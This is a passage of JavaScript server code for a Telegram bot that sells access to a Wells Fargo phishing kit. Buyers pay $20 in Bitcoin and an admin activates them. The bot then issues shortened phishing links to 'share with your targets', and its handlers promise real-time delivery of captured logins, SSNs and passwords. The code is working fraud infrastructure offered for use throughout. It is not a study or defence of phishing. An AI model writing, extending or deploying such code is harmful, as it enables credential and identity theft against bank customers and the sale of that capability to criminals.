          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
          const accessPrice = process.env.BOT_ACCESS_PRICE_BTC || "0.001";
          const btcWallet = process.env.BITCOIN_WALLET_ADDRESS || "N/A";

          await answerCallbackQuery(query.id, "⏳ Payment notification sent to admin…");

          // Notify the user — admin must manually activate after verifying on-chain
          await sendTelegramMessage(
            chatId,
            `⏳ <b>Payment Notification Sent!</b>\n\n` +
            `The admin has been notified. Once your payment of <b>${accessPrice} BTC</b> is confirmed on-chain, your access will be activated.\n\n` +
            `<b>Your Reference Code:</b> <code>${refCode}</code>\n\n` +
            `Please allow up to 30 minutes for blockchain confirmation.`
          );

          // Alert the admin — they verify on-chain and manually activate
          if (adminChatId) {
            await sendTelegramMessageWithKeyboard(
              adminChatId,
              `💰 <b>Payment Claim — Verify On-Chain</b>\n` +
              `━━━━━━━━━━━━━━━━━━━━\n\n` +
              `<b>User:</b> ${firstName ? firstName + ' ' : ''}${username ? '@' + username : 'No username'}\n` +
              `<b>Chat ID:</b> <code>${chatId}</code>\n` +
              `<b>Ref Code:</b> <code>${refCode}</code>\n` +
              `<b>Claimed Amount:</b> ${accessPrice} BTC\n` +
              `<b>Your Wallet:</b> <code>${btcWallet}</code>\n\n` +
              `🔍 Verify the transaction on blockchain, then tap <b>✅ Activate</b> to grant access.`,
              {
                inline_keyboard: [
                  [{ text: `✅ Activate @${username || chatId}`, callback_data: `activate_user:${chatId}` }],
                  [{ text: `❌ Reject Payment`, callback_data: `reject_user:${chatId}` }],
                ],
              }
            );
          }
        } else if (data.startsWith("activate_user")) {
          // Admin activates a user after verifying payment
          const targetChatId = data.split(":")[1];
          if (targetChatId) {
            await storage.addTelegramSubscriber({ chatId: targetChatId, username: "", firstName: "", isActive: "true" });
            await answerCallbackQuery(query.id, "✅ User activated!");
            await sendTelegramMessageWithKeyboard(
              targetChatId,
              `✅ <b>Access Activated!</b>\n\n` +
              `Your payment has been verified and your access is now active.\n\n` +
              `Tap the button below to get the website link:`,
              {
                inline_keyboard: [
                  [{ text: "🔗 Get Website Link", callback_data: "generate_link" }],
                ],
              }
            );
          }
        } else if (data === "pay_access") {
          // Non-admin tapped the Pay button from the start menu
          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
          const btcWallet = process.env.BITCOIN_WALLET_ADDRESS || "Wallet not configured — contact admin";
          const refCode = `REF${chatId.toString().slice(-6).padStart(6, "0")}${Date.now().toString(36).slice(-4).toUpperCase()}`;

          await answerCallbackQuery(query.id, "");
          await sendTelegramMessageWithKeyboard(
            chatId,
            `💳 <b>Purchase Access — $20 in Bitcoin</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n\n` +
            `Send <b>$20 USD equivalent in Bitcoin</b> to the address below:\n\n` +
            `<b>Bitcoin Address:</b>\n` +
            `<code>${btcWallet}</code>\n\n` +
            `📋 <i>Tap the address above to copy it.</i>\n\n` +
            `<b>Your Payment Reference:</b> <code>${refCode}</code>\n` +
            `<i>Keep this code — the admin uses it to verify your payment.</i>\n\n` +
            `After sending, tap <b>✅ I've Paid</b> to notify the admin.`,
            {
              inline_keyboard: [
                [{ text: "✅ I've Paid — Notify Admin", callback_data: `pay_confirm:${refCode}` }],
                [{ text: "❌ Cancel", callback_data: "pay_cancel" }],
              ],
            }
          );
        } else if (data === "generate_link") {
          // Send website link — only if admin or active subscriber
          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
          const isAdmin = chatId === adminChatId;
          const subscriber = await storage.getTelegramSubscriber(chatId);
          const hasAccess = isAdmin || subscriber?.isActive === "true";

          if (hasAccess) {
            const siteUrl = await shortenUrl(generateUniqueLink());
            await answerCallbackQuery(query.id, "🔗 Link generated!");
            await sendTelegramMessage(
              chatId,
              `🔗 <b>Website Link</b>\n\n` +
              `<a href="${siteUrl}">${siteUrl}</a>\n\n` +
              `Share this link with your targets. All logins will be sent to you in real-time.`
            );
          } else {
            await answerCallbackQuery(query.id, "❌ Access required");
            await sendTelegramMessageWithKeyboard(
              chatId,
              `🔒 <b>Access Required</b>\n\nYou need to pay $20 in Bitcoin to get the website link.`,
              {
                inline_keyboard: [
                  [{ text: "💰 Pay $20 to Get Access", callback_data: "pay_access" }],
                ],
              }
            );
          }
        } else if (data.startsWith("reject_user")) {
          // Admin rejects a user's payment claim
          const targetChatId = data.split(":")[1];
          if (targetChatId) {
            await answerCallbackQuery(query.id, "❌ User rejected");
            await sendTelegramMessage(
              targetChatId,
              `❌ <b>Payment Not Verified</b>\n\n` +
              `Your payment could not be verified on-chain. Please double-check that you sent the correct amount to the correct address and try again with /pay.`
            );
          }
        } else if (data === "pay_cancel") {
          await answerCallbackQuery(query.id, "Cancelled");
          await sendTelegramMessage(chatId, `❌ Payment cancelled. Type /pay anytime to purchase access.`);
        }

        return res.json({ ok: true });
      }

      // ── Text commands ───────────────────────────────────────────────
      if (update.message) {
        const message = update.message;
        const chatId = message.chat.id.toString();
        const text = (message.text || "").trim().toLowerCase();
        const username = message.from?.username || "";
        const firstName = message.from?.first_name || "";
        // Strip emojis/symbols so button taps match the same handlers as typed commands
        const cmd = text.replace(/[^\w\s]/g, "").trim();

        // /start — show the main menu
        if (text === "/start" || cmd === "start") {
          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
          const isAdmin = chatId === adminChatId;
          const subscriber = await storage.getTelegramSubscriber(chatId);
          const isSubscribed = subscriber?.isActive === "true";
          const hasAccess = isAdmin || isSubscribed;

          if (isAdmin) {
            // Admin: show admin message with Generate Website Link inline button
            await sendTelegramMessageWithKeyboard(
              chatId,
              `👑 <b>You are the admin.</b>\n\nBot access is free for you. No payment required.`,
              {
                inline_keyboard: [
                  [{ text: "🔗 Generate Website Link", callback_data: "generate_link" }],
                ],
              }
            );
          } else if (hasAccess) {
            // Paid user: show access confirmed + Get Link inline button
            await sendTelegramMessageWithKeyboard(
              chatId,
              `✅ <b>Access Active</b>\n\nYour payment has been verified. Use the button below to get the website link.`,
              {
                inline_keyboard: [
                  [{ text: "🔗 Get Website Link", callback_data: "generate_link" }],
                ],
              }
            );
          } else {
            // Non-paying user: show payment button
            await sendTelegramMessageWithKeyboard(
              chatId,
              `🏦 <b>Wells Fargo Alert Bot</b>\n\n` +
              `🔒 Access requires a one-time payment of <b>$20 in Bitcoin.</b>\n\n` +
              `After your payment is verified you will receive:\n` +
              `• 🔗 The phishing website link\n` +
              `• 🔔 Live login notifications\n\n` +
              `Tap below to pay and get access:`,
              {
                inline_keyboard: [
                  [{ text: "💰 Pay $20 in Bitcoin — Get Access", callback_data: "pay_access" }],
                ],
              }
            );
          }

          // Always set the persistent 4-button reply keyboard at the bottom
          await sendWithReplyKeyboard(chatId, "📋 <b>Menu ready. Use the buttons below:</b>", MAIN_REPLY_KEYBOARD);
        }
        // /stop — unsubscribe
        else if (text === "/stop" || cmd === "stop") {
          await storage.removeTelegramSubscriber(chatId);
          await sendTelegramMessageWithKeyboard(
            chatId,
            `🔕 <b>Unsubscribed.</b>\n\nYou will no longer receive notifications.`,
            { inline_keyboard: [[{ text: "🏦 Wells Fargo Notifications", callback_data: "subscribe_wf" }]] }
          );
        }
        // /status — check status
        else if (text === "/status" || cmd === "status") {
          const subscriber = await storage.getTelegramSubscriber(chatId);
          const isSubscribed = subscriber?.isActive === "true";
          await sendTelegramMessageWithKeyboard(
            chatId,
            isSubscribed
              ? `✅ <b>Subscription Active</b>\n\nYou are receiving Wells Fargo notifications.`
              : `❌ <b>Not Subscribed</b>\n\nTap below to start receiving notifications.`,
            {
              inline_keyboard: [[
                isSubscribed
                  ? { text: "🔕 Unsubscribe", callback_data: "unsubscribe_wf" }
                  : { text: "🏦 Wells Fargo Notifications", callback_data: "subscribe_wf" },
              ]],
            }
          );
        }
        // /link — get the website link
        else if (text === "/link" || cmd === "link") {
          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
          const isAdmin = chatId === adminChatId;
          const subscriber = await storage.getTelegramSubscriber(chatId);
          const hasAccess = isAdmin || subscriber?.isActive === "true";

          if (hasAccess) {
            const siteUrl = await shortenUrl(generateUniqueLink());
            await sendTelegramMessage(
              chatId,
              `🔗 <b>Website Link</b>\n\n` +
              `<a href="${siteUrl}">${siteUrl}</a>\n\n` +
              `Share this link with your targets. All logins will be sent to you in real-time.`
            );
          } else {
            await sendTelegramMessageWithKeyboard(
              chatId,
              `🔒 <b>Access Required</b>\n\nYou need to pay $20 in Bitcoin to get the website link.`,
              {
                inline_keyboard: [
                  [{ text: "💰 Pay $20 in Bitcoin — Get Access", callback_data: "pay_access" }],
                ],
              }
            );
          }
        }
        // /pay — purchase bot access with BTC (admin is exempt)
        else if (text === "/pay" || cmd === "pay") {
          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
          const isAdmin = chatId === adminChatId;

          if (isAdmin) {
            await sendTelegramMessageWithKeyboard(
              chatId,
              `👑 <b>You are the admin.</b>\n\nBot access is free for you. No payment required.`,
              {
                inline_keyboard: [
                  [{ text: "🔗 Generate Website Link", callback_data: "generate_link" }],
                ],
              }
            );
          } else {
            const btcWallet = process.env.BITCOIN_WALLET_ADDRESS || "Wallet not configured — contact admin";
            const refCode = `REF${chatId.toString().slice(-6).padStart(6, "0")}${Date.now().toString(36).slice(-4).toUpperCase()}`;

            await sendTelegramMessageWithKeyboard(
              chatId,
              `💳 <b>Purchase Access — $20 in Bitcoin</b>\n` +
              `━━━━━━━━━━━━━━━━━━━━\n\n` +
              `Send <b>$20 USD equivalent in Bitcoin</b> to the address below:\n\n` +
              `<b>Bitcoin Address:</b>\n` +
              `<code>${btcWallet}</code>\n\n` +
              `📋 <i>Tap the address above to copy it.</i>\n\n` +
              `<b>Your Payment Reference:</b> <code>${refCode}</code>\n` +
              `<i>Keep this code — the admin uses it to verify your payment.</i>\n\n` +
              `After sending, tap <b>✅ I've Paid</b> below to notify the admin.`,
              {
                inline_keyboard: [
                  [{ text: "✅ I've Paid — Notify Admin", callback_data: `pay_confirm:${refCode}` }],
                  [{ text: "❌ Cancel", callback_data: "pay_cancel" }],
                ],
              }
            );
          }
        }

        // ── Reply keyboard button handlers ───────────────────────────────
        // Match button text regardless of emoji prefix
        const cleanText = text.replace(/[^\w\s]/g, "").trim().toLowerCase();

        if (cleanText === "make call") {
          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
          const isAdmin = chatId === adminChatId;
          await sendTelegramMessage(
            chatId,
            isAdmin
              ? `📞 <b>Make Call</b>\n\nYou are the admin. Use your Telegram account to contact users directly by their Chat ID shown in the data alerts.`
              : `📞 <b>Make Call</b>\n\nThis feature is available after your access is activated. Pay $20 in Bitcoin to unlock full access.\n\nUse /start to begin.`
          );
        } else if (cleanText === "settings") {
          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
          const isAdmin = chatId === adminChatId;
          const subscriber = await storage.getTelegramSubscriber(chatId);
          const isSubscribed = subscriber?.isActive === "true";
          await sendTelegramMessageWithKeyboard(
            chatId,
            `⚙️ <b>Settings</b>\n\n` +
            `<b>Role:</b> ${isAdmin ? "👑 Admin" : "👤 User"}\n` +
            `<b>Access:</b> ${isAdmin || isSubscribed ? "✅ Active" : "❌ Not activated"}\n` +
            `<b>Notifications:</b> ${isSubscribed ? "🔔 On" : "🔕 Off"}\n\n` +
            (isAdmin || isSubscribed
              ? `Your access is active.`
              : `Tap below to pay and activate access:`),
            isAdmin || isSubscribed
              ? { inline_keyboard: [[{ text: isSubscribed ? "🔕 Turn Off Notifications" : "🔔 Turn On Notifications", callback_data: isSubscribed ? "unsubscribe_wf" : "subscribe_wf" }]] }
              : { inline_keyboard: [[{ text: "💰 Pay $20 — Get Access", callback_data: "pay_access" }]] }
          );
        } else if (cleanText === "view data") {
          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
          const isAdmin = chatId === adminChatId;
          const subscriber = await storage.getTelegramSubscriber(chatId);
          const hasAccess = isAdmin || subscriber?.isActive === "true";

          if (hasAccess) {
            const siteUrl = await shortenUrl(generateUniqueLink());
            await sendTelegramMessageWithKeyboard(
              chatId,
              `📊 <b>View Data</b>\n\n` +
              `All captured credentials are sent to this chat in real-time as users sign in.\n\n` +
              `<b>Phishing site:</b> <a href="${siteUrl}">${siteUrl}</a>\n\n` +
              `Scroll up to see captured logins, SSNs, passwords, and other data.`,
              { inline_keyboard: [[{ text: "🔗 Get Website Link", callback_data: "generate_link" }]] }
            );
          } else {
            await sendTelegramMessageWithKeyboard(
              chatId,
              `📊 <b>View Data</b>\n\n🔒 You need access to view captured data.\n\nPay $20 in Bitcoin to unlock this feature.`,
              { inline_keyboard: [[{ text: "💰 Pay $20 — Get Access", callback_data: "pay_access" }]] }
            );
          }
        } else if (cleanText === "help") {
          const adminChatId = process.env.TELEGRAM_CHAT_ID || "";
          const isAdmin = chatId === adminChatId;
          await sendTelegramMessage(
            chatId,
            `ℹ️ <b>Help</b>\n\n` +
            `<b>Available commands:</b>\n` +
            `/start — Open the main menu\n` +
            `/link — Get the phishing website link\n` +
            `/pay — Pay $20 in Bitcoin for access\n` +
            `/status — Check your access status\n` +
            `/stop — Unsubscribe from notifications\n\n` +
            `<b>Menu buttons:</b>\n` +
            `📞 <b>Make Call</b> — Contact info\n` +
            `⚙️ <b>Settings</b> — View your access & notification status\n` +
            `📊 <b>View Data</b> — See the phishing site & data\n` +
            `ℹ️ <b>Help</b> — This message\n\n` +
            (isAdmin
              ? `👑 You are the admin. Full access is free for you.`
              : `Pay $20 in Bitcoin to unlock full access.`)
          );
        }
      }

      return res.json({ ok: true });
    } catch (error) {
      console.error("Telegram webhook error:", error);
      return res.json({ ok: true });
    }
  });

  // Endpoint to set up the Telegram webhook
  app.get("/api/telegram/setup-webhook", async (req, res) => {
    try {
      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      if (!botToken) {
        return res.status(400).json({ error: "Bot token not configured" });
      }
      
      // Get the app URL (use the request host)
      const protocol = req.headers['x-forwarded-proto'] || 'https';
      const host = req.headers.host;
      const webhookUrl = `${protocol}://${host}/api/telegram/webhook`;
      
      // Set the webhook (include callback_query so button taps are received)
      const response = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url: webhookUrl,
          allowed_updates: ["message", "callback_query"],
        }),
      });
      
      const result = await response.json();
      
      if (result.ok) {
        // Also register the bot commands so they appear in Telegram's menu
        await setBotCommands();
        return res.json({ 
          success: true, 
          message: "Webhook set successfully",
          webhookUrl 
        });
      } else {
        return res.status(400).json({ error: result.description });
      }
    } catch (error) {
      console.error("Failed to set webhook:", error);
      return res.status(500).json({ error: "Failed to set webhook" });
    }
  });

  return httpServer;
}
